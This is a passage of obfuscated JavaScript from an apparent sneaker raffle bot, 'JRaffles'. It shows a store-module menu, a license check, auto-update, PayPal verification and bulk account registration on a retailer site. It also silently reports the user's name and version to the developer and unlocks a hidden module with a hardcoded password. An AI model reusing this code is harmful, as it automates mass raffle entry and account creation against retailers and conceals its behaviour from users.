    var _0x40305f = await _0x2fefe9(), _0x12db60 = _0x768c3f['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x5a6567 = _0x38692b['parse'](_0x12db60, { 'header': !![] })['data'];
    for (var _0x185a74 = 0x0; _0x185a74 < _0x5a6567['length']; _0x185a74++) {
        var _0xb99637 = _0x5a6567[_0x185a74]['Store'], _0x5838bb = _0x5a6567[_0x185a74]['Mode'];
        for (var _0x3b75cc of _0x514297) {
            const _0x489426 = _0x3b75cc['name']['includes'](_0xb99637);
            if (_0x489426)
                for (mode of _0x514297[_0x3b75cc]['modules']) {
                    const _0x22aa6c = mode['name']['includes'](_0x5838bb);
                    _0x22aa6c && (_0x8f24bd = mode['name'], await mode['function'](_0x8f24bd, _0x5a6567[_0x185a74], _0x40305f));
                }
        }
    }
}
async function _0x8b416d() {
    await _0x14e67a(), console['clear'](), _0x4b1e6b['threads'] = 0x1;
    if (_0x1701ba != 'devkey') {
        let _0x2fb207 = await _0x43a114['autoUpdate']();
        if (_0x2fb207 === 'yes')
            return _0x45483f('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x283e36 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x590479(0x2710);
        ;
    }
    await _0x50d7e1(_0x283e36);
    if (_0x5f37c0 === ![])
        return console['log']('Closing\x20Browser'), await _0x590479(0xbb8);
    else
        try {
            var _0x1de369 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x3d4e83
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x1701ba
                    }
                ]
            }];
            const _0x476aad = { 'embeds': _0x1de369 };
            var _0x4e7f91 = await _0x54f36f(null, null, 'open', ![]);
            const _0x326f52 = { 'openDEVMSG': { 'embeds': [_0x4e7f91] } };
            await _0x1690f0(_0x22d1a8, _0x326f52['openDEVMSG']);
            async function _0x39d0ef() {
                _0x39f641('JRaffles\x20' + _0x1701ba), console['clear'](), console['log']('Hello\x20' + _0x4fb298['cyan']('' + _0x3d4e83) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x1701ba), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x3c1ad2 = 0x0; _0x3c1ad2 < _0x514297['length'] - 0x4; _0x3c1ad2++) {
                    if (_0x3c1ad2 >= 0xa) {
                        console['log']('\x20(' + _0x3c1ad2 + ')\x20[' + _0x514297[_0x3c1ad2]['name'] + ']');
                        continue;
                    }
                    if (_0x514297[_0x3c1ad2]['name'] === 'Reload\x20Settings' || _0x514297[_0x3c1ad2]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x3c1ad2 + ')\x20\x20[' + _0x514297[_0x3c1ad2]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x514297['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x514297['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x514297['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x514297['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x101370();
                if (taskModule > _0x514297['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x590479(0x3e8), _0x39d0ef();
                if (_0x514297[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x3870e9(_0x514297[taskModule]['modules']);
                    var _0x18571a = _0x514297[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x7a6273 = await _0x2fefe9();
                            await _0x18571a['function'](_0x18571a, _0x7a6273);
                        }
                        if (taskFunction == 0x2) {
                            var _0x7a6273 = await _0x2fefe9(), _0x1fa65a = await _0x1f3dde(_0x18571a);
                            _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x1fa65a), await _0x18571a['function'](_0x18571a, _0x1fa65a, _0x7a6273);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x7a6273 = await _0x2fefe9(), _0x1fa65a = await _0x1f3dde(_0x18571a);
                                _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x1fa65a), await _0x18571a['function'](_0x18571a, _0x1fa65a, _0x7a6273);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x7a6273 = await _0x2fefe9();
                                    await _0x18571a['function'](_0x18571a, _0x7a6273);
                                }
                            }
                        }
                    } catch (_0x401a83) {
                        console['log'](_0x401a83), await _0x590479(0x7d0);
                    }
                    return _0x39d0ef();
                }
                if (_0x514297[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x3870e9(_0x514297[taskModule]['modules']);
                        var _0x18571a = _0x514297[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x7a6273 = await _0x2fefe9(), _0x4b544a = await _0x1f3dde(_0x18571a);
                            _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x4b544a), await _0x18571a['function'](_0x18571a, _0x4b544a, _0x7a6273);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x7a6273 = await _0x2fefe9(), _0x4b544a = await _0x1f3dde(_0x18571a);
                                _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x4b544a), await _0x18571a['function'](_0x18571a, _0x4b544a, _0x7a6273);
                            }
                        }
                    } catch (_0x568be7) {
                        console['log'](_0x568be7), await _0x590479(0xfa0);
                    }
                    return _0x39d0ef();
                }
                if (_0x514297[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x3870e9(_0x514297[taskModule]['modules']);
                        var _0x18571a = _0x514297[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x7a6273 = await _0x2fefe9(), _0x4b544a = await _0x1f3dde(_0x18571a);
                            _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x4b544a), await _0x18571a['function'](_0x18571a, _0x4b544a, _0x7a6273);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x7a6273 = await _0x2fefe9(), _0x4b544a = await _0x1f3dde(_0x18571a);
                                _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x4b544a), await _0x18571a['function'](_0x18571a, _0x4b544a, _0x7a6273);
                            }
                        }
                    } catch (_0x88086c) {
                        console['log'](_0x88086c), await _0x590479(0xfa0);
                    }
                    return _0x39d0ef();
                }
                if (_0x514297[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x3870e9(_0x514297[taskModule]['modules']);
                    var _0x18571a = _0x514297[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x7a6273 = await _0x2fefe9();
                        return await _0x18571a['function'](_0x18571a, _0x7a6273), _0x39d0ef();
                    }
                    var _0x7a6273 = await _0x2fefe9(), _0x3ae765 = await _0x1f3dde(_0x18571a);
                    return _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x3ae765), await _0x18571a['function'](_0x18571a, _0x3ae765, _0x7a6273), _0x39d0ef();
                }
                if (_0x514297[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x3870e9(_0x514297[taskModule]['modules']);
                    var _0x18571a = _0x514297[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x7a6273 = await _0x2fefe9(), _0x3ae765 = await _0x1f3dde(_0x18571a);
                    return _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x3ae765), await _0x18571a['function'](_0x18571a, _0x3ae765, _0x7a6273), _0x39d0ef();
                }
                if (_0x514297[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x3870e9(_0x514297[taskModule]['modules']);
                    var _0x18571a = _0x514297[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x7a6273 = await _0x2fefe9(), _0x3ae765 = await _0x1f3dde(_0x18571a);
                    return _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x3ae765), await _0x18571a['function'](_0x18571a, _0x3ae765, _0x7a6273), _0x39d0ef();
                }
                if (_0x514297[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x3870e9(_0x514297[taskModule]['modules']);
                    var _0x18571a = _0x514297[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x7a6273 = await _0x2fefe9(), _0x3ae765 = await _0x1f3dde(_0x18571a);
                    return _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x3ae765), await _0x18571a['function'](_0x18571a, _0x3ae765, _0x7a6273), _0x39d0ef();
                } else {
                    if (_0x514297[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x3870e9(_0x514297[taskModule]['modules']);
                        var _0x18571a = _0x514297[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x7a6273 = await _0x2fefe9(), _0x1dfbbc = await _0x1f3dde(_0x18571a);
                            return _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x1dfbbc), await _0x18571a['function'](_0x18571a, _0x1dfbbc, _0x7a6273), _0x39d0ef();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x7a6273 = await _0x2fefe9();
                                return await _0x18571a['function'](_0x18571a, null, _0x7a6273), _0x39d0ef();
                            }
                        }
                        ;
                    } else {
                        if (_0x514297[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x3870e9(_0x514297[taskModule]['modules']);
                            var _0x18571a = _0x514297[taskModule]['modules'][taskFunction], _0x7a6273 = await _0x2fefe9(), _0x59b574 = await _0x1f3dde(_0x18571a);
                            return _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x59b574), await _0x18571a['function'](_0x18571a, _0x59b574, _0x7a6273), await _0x590479(0x1388), _0x39d0ef();
                        } else {
                            if (_0x514297[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x3870e9(_0x514297[taskModule]['modules']);
                                var _0x18571a = _0x514297[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x7a6273 = await _0x2fefe9(), _0x1dfbbc = await _0x1f3dde(_0x18571a);
                                    return _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x1dfbbc), await _0x18571a['function'](_0x18571a, _0x1dfbbc, _0x7a6273), _0x39d0ef();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x7a6273 = await _0x2fefe9();
                                        return await _0x18571a['function'](_0x18571a, null, _0x7a6273), _0x39d0ef();
                                    }
                                }
                                ;
                            } else {
                                if (_0x514297[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x3870e9(_0x514297[taskModule]['modules']);
                                    var _0x18571a = _0x514297[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await bwAcc('https://bouncewear.com/nl/account/register', _0x18571a);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x514297[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x3870e9(_0x514297[taskModule]['modules']);
                                        var _0x18571a = _0x514297[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x7a6273 = await _0x2fefe9(), _0x322bcd = await _0x1f3dde(_0x18571a);
                                            return _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x322bcd), await _0x18571a['function'](_0x18571a, _0x322bcd, _0x7a6273), _0x39d0ef();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x7a6273 = await _0x2fefe9(), _0x322bcd = await _0x1f3dde(_0x18571a);
                                                return _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x322bcd), await _0x18571a['function'](_0x18571a, _0x322bcd, _0x7a6273), _0x39d0ef();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x514297[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x3870e9(_0x514297[taskModule]['modules']);
                                            var _0x18571a = _0x514297[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x7a6273 = await _0x2fefe9(), _0x2fd668 = await _0x1f3dde(_0x18571a);
                                                return _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x2fd668), await _0x18571a['function'](_0x18571a, _0x2fd668, _0x7a6273), _0x39d0ef();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x7a6273 = await _0x2fefe9(), _0x2fd668 = await _0x1f3dde(_0x18571a);
                                                    return _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x2fd668), await _0x18571a['function'](_0x18571a, _0x2fd668, _0x7a6273), _0x39d0ef();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x514297[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x3870e9(_0x514297[taskModule]['modules']);
                                                var _0x18571a = _0x514297[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x7a6273 = await _0x2fefe9(), _0x4e5f20 = await _0x1f3dde(_0x18571a);
                                                    return _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x4e5f20), await _0x18571a['function'](_0x18571a, _0x4e5f20, _0x7a6273), _0x39d0ef();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x7a6273 = await _0x2fefe9(), _0x4e5f20 = await _0x1f3dde(_0x18571a);
                                                        return _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x4e5f20), await _0x18571a['function'](_0x18571a, _0x4e5f20, _0x7a6273), _0x39d0ef();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x514297[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x3870e9(_0x514297[taskModule]['modules']);
                                                    var _0x18571a = _0x514297[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x7a6273 = await _0x2fefe9(), _0x2f530f = await _0x1f3dde(_0x18571a);
                                                        return _0x4b1e6b['shuffleTasks'] && await _0x155463(_0x2f530f), await _0x18571a['function'](_0x18571a, _0x2f530f, _0x7a6273), _0x39d0ef();
                                                    }
                                                } else {
                                                    if (_0x514297[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x590479(0x3e8), _0x39d0ef();
                                                    else {
                                                        if (_0x514297[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x45dbfd = _0x514297[taskModule]['name'], _0x7a6273 = await _0x2fefe9();
                                                            return await _0x2cde91(_0x45dbfd, _0x7a6273), _0x39d0ef();
                                                        } else {
                                                            if (_0x514297[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x3870e9(_0x514297[taskModule]['modules']);
                                                                var _0x18571a = _0x514297[taskModule]['modules'][taskFunction];
                                                                return await _0x18571a['function'](_0x18571a), _0x39d0ef();
                                                            } else {
                                                                if (_0x514297[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x4b8ba7 = 0x0;
                                                                    for (const _0x529bf4 in _0x4b1e6b) {
                                                                        console['log']('(' + _0x4b8ba7 + ')\x20' + _0x529bf4 + '\x20:\x20' + _0x4b1e6b[_0x529bf4]), _0x4b8ba7++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x4b8ba7 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x4a6dd8 = await _0x2ea2f0();
                                                                    if (_0x4a6dd8 == _0x4b8ba7)
                                                                        return _0x39d0ef();
                                                                    console['clear'];
                                                                    var _0x2e4636 = 0x0;
                                                                    for (var _0xdc90e1 in _0x4b1e6b) {
                                                                        if (_0x4a6dd8 == _0x2e4636) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0xdc90e1 + '\x20:'), _0x4b1e6b[_0xdc90e1] = await _0x2a73f1(), _0x768c3f['writeFileSync']('../settings.json', JSON['stringify'](_0x4b1e6b));
                                                                            break;
                                                                        } else
                                                                            _0x2e4636++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x590479(0xbb8), _0x39d0ef();
                                                                } else {
                                                                    if (_0x514297[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x14e67a(), _0x39d0ef();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x514297[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x850e46 = await _0x105c1a();
                                                                            _0x850e46 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x1f34c7(), await afewFunction(_0x3191c2[_0x1de284], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x590479(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x39d0ef();
            } catch (_0x3b9f99) {
                return console['log'](_0x3b9f99), _0x39d0ef();
            }
        } catch (_0x2f5249) {
            return console['log'](_0x2f5249), await _0x590479(0x3a98);
        }
}
;
_0x39f641('JRaffles\x20' + _0x1701ba), _0x14e67a();
try {
    _0x8b416d();
} catch (_0x18454d) {
    var _0x466da5 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x3d4e83
            },
            {
                'name': 'Version',
                'value': '' + _0x1701ba
            },
            {
                'name': 'Error',
                'value': '' + _0x18454d
            }
        ]
    }];
    const _0xa615d3 = { 'embeds': _0x466da5 };
    _0x1690f0(_0x874ee1, _0xa615d3);
}